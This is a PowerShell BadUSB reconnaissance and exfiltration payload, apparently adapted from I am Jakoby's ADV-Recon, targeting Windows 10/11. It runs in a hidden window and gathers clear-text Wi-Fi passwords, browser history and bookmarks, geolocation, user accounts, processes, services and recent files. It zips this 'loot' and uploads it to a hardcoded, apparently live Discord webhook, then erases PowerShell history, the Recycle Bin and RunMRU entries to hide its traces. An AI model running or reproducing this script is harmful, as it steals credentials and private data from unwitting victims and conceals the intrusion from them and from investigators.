############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                        
#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#
.SYNOPSIS
    This is an advanced recon of a target PC and exfiltration of that data.
.DESCRIPTION 
    This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
    All of the gathered information is formatted neatly and output to a file.
    That file is then exfiltrated to Discord via a webhook.
#>

# Ocultar la ventana de PowerShell
$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
Add-Type -Name win -MemberDefinition $i -Namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);

# Crear carpeta, archivo y ZIP
$FolderName = "$env:USERNAME-LOOT-$(Get-Date -f yyyy-MM-dd_hh-mm)"
$FileName = "$FolderName.txt"
$ZIP = "$FolderName.zip"
$lootDir = "$env:tmp\$FolderName"

try {
    New-Item -Path $lootDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
} catch {
    Write-Error "Error al crear la carpeta $lootDir : $_"
    exit
}

# Webhook de Discord
$dc = "https://discord.com/api/webhooks/1403475722776871033/762S8PxXk-xvAR5_0v95C5Of-pfWYKpJnYO3i1e5w9CEFiz-HUQByB_8ycBZKs4DzaXt"

# Recon all User Directories
try {
    tree $Env:userprofile /a /f > "$lootDir\tree.txt"
} catch {
    Write-Error "Error al generar el árbol de directorios: $_"
}

# Powershell history
try {
    Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination "$lootDir\Powershell-History.txt" -ErrorAction SilentlyContinue
} catch {
    Write-Error "Error al copiar el historial de PowerShell: $_"
}

# Obtener nombre completo
function Get-fullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
        return $fullName
    } catch {
        Write-Error "No se detectó un nombre: $_"
        return $env:UserName
    }
}
$fullName = Get-fullName

# Obtener email
function Get-email {
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    } catch {
        Write-Error "No se encontró un email: $_"
        return "No Email Detected"
    }
}
$email = Get-email

# Obtener geolocalización
function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }
        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Error 'Acceso denegado para información de ubicación'
            return "No Coordinates found"
        } else {
            $GeoWatcher.Position.Location | Select-Object Latitude,Longitude
        }
    } catch {
        Write-Error "No se encontraron coordenadas: $_"
        return "No Coordinates found"
    }
}
$GeoLocation = Get-GeoLocation
$GeoLocation = $GeoLocation -split " "
$Lat = if ($GeoLocation[0]) { $GeoLocation[0].Substring(11) -replace ".$" } else { "N/A" }
$Lon = if ($GeoLocation[1]) { $GeoLocation[1].Substring(10) -replace ".$" } else { "N/A" }

# Usuarios locales
try {
    $luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String
} catch {
    Write-Error "Error al obtener usuarios locales: $_"
}

# Estado de UAC
try {
    $Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    $ConsentPromptBehaviorAdmin_Value = (Get-ItemProperty $Key ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
    $PromptOnSecureDesktop_Value = (Get-ItemProperty $Key PromptOnSecureDesktop).PromptOnSecureDesktop
    if ($ConsentPromptBehaviorAdmin_Value -eq 0 -and $PromptOnSecureDesktop_Value -eq 0) { $UAC = "Never notify" }
    elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 0) { $UAC = "Notify me only when apps try to make changes to my computer (do not dim my desktop)" }
    elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 1) { $UAC = "Notify me only when apps try to make changes to my computer (default)" }
    elseif ($ConsentPromptBehaviorAdmin_Value -eq 2 -and $PromptOnSecureDesktop_Value -eq 1) { $UAC = "Always notify" }
    else { $UAC = "Unknown" }
} catch {
    Write-Error "Error al obtener estado de UAC: $_"
    $UAC = "Error"
}

# Estado de LSASS
try {
    $lsass = Get-Process -Name "lsass"
    $lsass = if ($lsass.ProtectedProcess) { "LSASS is running as a protected process." } else { "LSASS is not running as a protected process." }
} catch {
    Write-Error "Error al verificar LSASS: $_"
    $lsass = "Error"
}

# Estado de RDP
try {
    if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) {
        $RDP = "RDP is Enabled"
    } else {
        $RDP = "RDP is NOT enabled"
    }
} catch {
    Write-Error "Error al verificar RDP: $_"
    $RDP = "Error"
}

# Contenidos de la carpeta de inicio
try {
    $StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name | Out-String
} catch {
    Write-Error "Error al obtener contenidos de la carpeta de inicio: $_"
    $StartUp = "Error"
}

# Redes Wi-Fi cercanas
try {
    $NearbyWifi = (netsh wlan show networks mode=Bssid | Where-Object { $_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*" }).trim() | Out-String
} catch {
    Write-Error "Error al obtener redes Wi-Fi cercanas: $_"
    $NearbyWifi = "No nearby wifi networks detected"
}

# Información de red
try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
} catch {
    $computerPubIP = "Error getting Public IP"
}
try {
    $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixOrigin | Out-String
} catch {
    $localIP = "Error getting local IP"
}
try {
    $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select-Object Name, MacAddress, Status | Out-String
} catch {
    $MAC = "Error getting MAC address"
}

# Información del sistema
try {
    $computerSystem = Get-CimInstance CIM_ComputerSystem
    $computerName = $computerSystem.Name
    $computerModel = $computerSystem.Model
    $computerManufacturer = $computerSystem.Manufacturer
    $computerBIOS = Get-CimInstance CIM_BIOSElement | Out-String
    $computerOs = (Get-WMIObject win32_operatingsystem) | Select-Object Caption, Version | Out-String
    $computerCpu = Get-WmiObject Win32_Processor | Select-Object DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List | Out-String
    $computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List | Out-String
    $computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) } | Out-String
    $computerRam = Get-WmiObject Win32_PhysicalMemory | Select-Object DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table | Out-String
} catch {
    Write-Error "Error al obtener información del sistema: $_"
}

# Tareas programadas
try {
    $ScheduledTasks = Get-ScheduledTask | Out-String
} catch {
    Write-Error "Error al obtener tareas programadas: $_"
    $ScheduledTasks = "Error"
}

# Sesiones de logon
try {
    $klist = klist sessions | Out-String
} catch {
    Write-Error "Error al obtener sesiones de logon: $_"
    $klist = "Error"
}

# Archivos recientes
try {
    $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime | Out-String
} catch {
    Write-Error "Error al obtener archivos recientes: $_"
    $RecentFiles = "Error"
}

# Discos duros
try {
    $driveType = @{ 2="Removable disk"; 3="Fixed local disk"; 4="Network disk"; 5="Compact disk" }
    $Hdds = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem, VolumeSerialNumber, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName, DriveType, FileSystem, VolumeSerialNumber, @{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } | Out-String
} catch {
    Write-Error "Error al obtener información de discos: $_"
    $Hdds = "Error"
}

# Dispositivos COM
try {
    $COMDevices = Get-WmiObject Win32_USBControllerDevice | ForEach-Object { [Wmi]($_.Dependent) } | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -Width 250
} catch {
    Write-Error "Error al obtener dispositivos COM: $_"
    $COMDevices = "Error"
}

# Adaptadores de red
try {
    $NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -notlike $null } | Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -Width 250
} catch {
    Write-Error "Error al obtener adaptadores de red: $_"
    $NetworkAdapters = "Error"
}

# Perfiles Wi-Fi
try {
    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $name=$_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object { (netsh wlan show profile name="$name" key=clear) } | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $pass=$_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object { [PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } } | Format-Table -AutoSize | Out-String
} catch {
    Write-Error "Error al obtener perfiles Wi-Fi: $_"
    $wifiProfiles = "Error"
}

# Procesos
try {
    $process = Get-WmiObject win32_process | Select-Object Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -Width 250
} catch {
    Write-Error "Error al obtener procesos: $_"
    $process = "Error"
}

# Listeners
try {
    $listener = Get-NetTCPConnection | Select-Object @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
    $listener = $listener | ForEach-Object {
        $listenerItem = $_
        $processItem = ($process | Where-Object { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
        New-Object PSObject -Property @{
            "LocalAddress" = $listenerItem.LocalAddress
            "RemoteAddress" = $listenerItem.RemoteAddress
            "State" = $listenerItem.State
            "AppliedSetting" = $listenerItem.AppliedSetting
            "OwningProcess" = $listenerItem.OwningProcess
            "ProcessName" = $processItem.ProcessName
        }
    } | Select-Object LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -Width 250
} catch {
    Write-Error "Error al obtener listeners: $_"
    $listener = "Error"
}

# Servicios
try {
    $service = Get-WmiObject win32_service | Select-Object State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -Width 250
} catch {
    Write-Error "Error al obtener servicios: $_"
    $service = "Error"
}

# Software instalado
try {
    $software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -notlike $null } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -Width 250
} catch {
    Write-Error "Error al obtener software instalado: $_"
    $software = "Error"
}

# Drivers
try {
    $drivers = Get-WmiObject Win32_PnPSignedDriver | Where-Object { $_.DeviceName -notlike $null } | Select-Object DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -Width 250
} catch {
    Write-Error "Error al obtener drivers: $_"
    $drivers = "Error"
}

# Tarjeta de video
try {
    $videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -Width 250
} catch {
    Write-Error "Error al obtener información de la tarjeta de video: $_"
    $videocard = "Error"
}

# Salida de resultados a un archivo
$output = @"
############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                        
#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

Full Name: $fullName
Email: $email
GeoLocation:
Latitude: $Lat
Longitude: $Lon
------------------------------------------------------------------------------------------------------------------------------
Local Users:
$luser
------------------------------------------------------------------------------------------------------------------------------
UAC State:
$UAC
LSASS State:
$lsass
RDP State:
$RDP
------------------------------------------------------------------------------------------------------------------------------
Public IP:
$computerPubIP
Local IPs:
$localIP
MAC:
$MAC
------------------------------------------------------------------------------------------------------------------------------
Computer Name:
$computerName
Model:
$computerModel
Manufacturer:
$computerManufacturer
BIOS:
$computerBIOS
OS:
$computerOs
CPU:
$computerCpu
Mainboard:
$computerMainboard
Ram Capacity:
$computerRamCapacity
Total installed Ram:
$computerRam
Video Card:
$videocard
------------------------------------------------------------------------------------------------------------------------------
Contents of Start Up Folder:
$StartUp
------------------------------------------------------------------------------------------------------------------------------
Scheduled Tasks:
$ScheduledTasks
------------------------------------------------------------------------------------------------------------------------------
Logon Sessions:
$klist
------------------------------------------------------------------------------------------------------------------------------
Recent Files:
$RecentFiles
------------------------------------------------------------------------------------------------------------------------------
Hard-Drives:
$Hdds
COM Devices:
$COMDevices
------------------------------------------------------------------------------------------------------------------------------
Network Adapters:
$NetworkAdapters
------------------------------------------------------------------------------------------------------------------------------
Nearby Wifi:
$NearbyWifi
Wifi Profiles:
$wifiProfiles
------------------------------------------------------------------------------------------------------------------------------
Process:
$process
------------------------------------------------------------------------------------------------------------------------------
Listeners:
$listener
------------------------------------------------------------------------------------------------------------------------------
Services:
$service
------------------------------------------------------------------------------------------------------------------------------
Installed Software:
$software
------------------------------------------------------------------------------------------------------------------------------
Drivers:
$drivers
------------------------------------------------------------------------------------------------------------------------------
"@

try {
    $output | Out-File -FilePath "$lootDir\computerData.txt" -Encoding UTF8 -ErrorAction Stop
} catch {
    Write-Error "Error al guardar computerData.txt: $_"
}

# Datos de navegadores
function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Browser,
        [Parameter(Mandatory=$true)]
        [string]$DataType
    )
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    if ($Browser -eq 'chrome' -and $DataType -eq 'history') { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
    try {
        if (Test-Path $Path) {
            $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { ($_.Matches).Value } | Sort-Object -Unique
            $Value | ForEach-Object {
                New-Object -TypeName PSObject -Property @{
                    User = $env:UserName
                    Browser = $Browser
                    DataType = $DataType
                    Data = $_
                }
            }
        }
    } catch {
        Write-Error "Error al obtener datos de $Browser ($DataType): $_"
    }
}

try {
    Get-BrowserData -Browser "edge" -DataType "history" | Out-File -FilePath "$lootDir\BrowserData.txt" -Append -Encoding UTF8
    Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -FilePath "$lootDir\BrowserData.txt" -Append -Encoding UTF8
    Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -FilePath "$lootDir\BrowserData.txt" -Append -Encoding UTF8
    Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -FilePath "$lootDir\BrowserData.txt" -Append -Encoding UTF8
    Get-BrowserData -Browser "firefox" -DataType "history" | Out-File -FilePath "$lootDir\BrowserData.txt" -Append -Encoding UTF8
} catch {
    Write-Error "Error al guardar datos de navegadores: $_"
}

# Comprimir archivos
try {
    Compress-Archive -Path $lootDir\* -DestinationPath "$env:tmp\$ZIP" -Force -ErrorAction Stop
} catch {
    Write-Error "Error al crear el ZIP: $_"
    exit
}

# Subir archivo a Discord

function Upload-Discord {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$File,
        [Parameter(Mandatory = $true)]
        [string]$WebhookUrl,
        [Parameter(Mandatory = $false)]
        [string]$Message = "Archivo subido desde PowerShell"
    )
    try {
        if (-not (Test-Path $File)) {
            Write-Error "El archivo $File no existe."
            return
        }

        $form = @{
            "content" = $Message
            "file1"   = Get-Item $File
        }

        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form $form -ErrorAction Stop
        Write-Host "✅ Archivo enviado con éxito" -ForegroundColor Green
    }
    catch {
        Write-Error "Error al enviar el archivo a Discord: $_"
    }
}


try {
    Upload-Discord -File "$env:tmp\$ZIP" -WebhookUrl $dc -Message "Reconocimiento completado desde $env:COMPUTERNAME" -ErrorAction Stop
} catch {
    Write-Error "Error al ejecutar Upload-Discord: $_"
}

# Limpieza
try {
    Remove-Item -Path $lootDir -Recurse -Force -ErrorAction Stop
    Remove-Item -Path "$env:tmp\$ZIP" -Force -ErrorAction Stop
    Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f -ErrorAction SilentlyContinue
} catch {
    Write-Error "Error al limpiar archivos temporales: $_"
}

# Mensaje de finalización (opcional, puedes comentarlo si no quieres que aparezca)
# $done = New-Object -ComObject Wscript.Shell; $done.Popup("Update Completed",1)
